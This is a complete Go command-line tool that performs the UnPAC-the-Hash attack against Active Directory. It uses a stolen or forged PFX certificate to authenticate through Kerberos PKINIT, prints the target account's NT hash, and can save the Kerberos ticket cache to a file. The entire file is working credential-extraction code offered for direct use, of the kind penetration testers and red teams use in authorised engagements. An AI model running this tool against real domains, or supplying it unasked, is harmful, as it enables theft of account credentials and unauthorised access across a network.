package main

import (
	"context"
	"fmt"
	"os"

	"github.com/bryanmcnulty/adauth/ccachetools"
	"github.com/bryanmcnulty/adauth/pkinit"
	"github.com/spf13/pflag"
)

func run() error {
	var (
		username    string
		domain      string
		pfxFile     string
		pfxPassword string
		ccacheName  string
		dc          string
	)

	pflag.StringVarP(&username, "username", "u", "", "Username (overrides UPN in PFX)")
	pflag.StringVarP(&domain, "domain", "d", "", "Domain (overrides UPN in PFX)")
	pflag.StringVar(&pfxFile, "pfx", "", "PFX file")
	pflag.StringVarP(&pfxPassword, "pfx-password", "p", "", "PFX file password")
	pflag.StringVar(&ccacheName, "cache", "", "CCache output file name")
	pflag.StringVar(&dc, "dc", "", "Domain controller (optional)")
	pflag.Parse()

	ccache, hash, err := pkinit.UnPACTheHashFromPFX(context.Background(), username, domain, pfxFile, pfxPassword, dc)
	if err != nil {
		return fmt.Errorf("UnPAC-the-Hash: %w", err)
	}

	fmt.Println("Authentication was successful")
	fmt.Printf("%s\\%s: %s\n", ccache.DefaultPrincipal.Realm,
		ccache.DefaultPrincipal.PrincipalName.PrincipalNameString(), hash.Combined())

	if ccacheName != "" {
		ccacheBytes, err := ccachetools.MarshalCCache(ccache)
		if err != nil {
			return fmt.Errorf("marshal CCache: %w", err)
		}

		err = os.WriteFile(ccacheName, ccacheBytes, 0o600)
		if err != nil {
			return fmt.Errorf("write CCache: %w", err)
		}

		fmt.Println("Saved CCache at", ccacheName)
	}

	return nil
}

func main() {
	err := run()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)

		os.Exit(1)
	}
}
